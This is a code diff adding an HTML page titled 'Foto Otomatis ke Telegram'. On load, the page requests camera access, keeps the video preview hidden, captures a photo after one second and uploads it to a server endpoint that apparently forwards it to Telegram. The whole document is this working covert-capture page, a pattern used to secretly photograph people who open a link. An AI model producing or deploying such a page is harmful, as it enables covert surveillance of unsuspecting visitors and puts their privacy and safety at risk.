@@ -1,0 +1,55 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>Foto Otomatis ke Telegram</title>
+  <style>
+    body { font-family:sans-serif; display:flex; flex-direction:column; align-items:center; padding:24px; }
+    video { display:none; } /* video disembunyikan karena otomatis */
+  </style>
+</head>
+<body>
+  <h2>Web otomatis capture foto</h2>
+  <video id="video" autoplay playsinline></video>
+
+  <script>
+    const video = document.getElementById('video');
+
+    async function startCam() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // begitu kamera aktif, langsung ambil & kirim foto
+        video.onloadedmetadata = () => {
+          setTimeout(captureAndSend, 1000); // tunggu 1 detik agar video siap
+        };
+      } catch (err) {
+        console.error('Gagal akses kamera:', err);
+      }
+    }
+
+    startCam();
+
+    async function captureAndSend() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+
+      try {
+        await fetch('/api/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: dataUrl })
+        });
+        console.log('Foto berhasil dikirim ke Telegram');
+      } catch (err) {
+        console.error('Gagal kirim:', err);
+      }
+    }
+  </script>
+</body>
+</html>
